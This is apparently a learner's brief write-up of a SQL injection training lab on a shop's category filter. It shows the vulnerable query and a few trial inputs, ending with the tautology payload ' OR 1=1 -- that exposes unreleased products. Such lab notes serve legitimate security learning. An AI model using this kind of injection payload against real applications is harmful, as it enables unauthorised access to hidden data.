Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

END GOAL: Display all gifts released and unreleased 

ANALYSIS: 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = '--' AND released = 1
SELECT * FROM products WHERE category = '+OR+1=1--' AND released = 1
'or 1=1 --' was the SQL payload solution
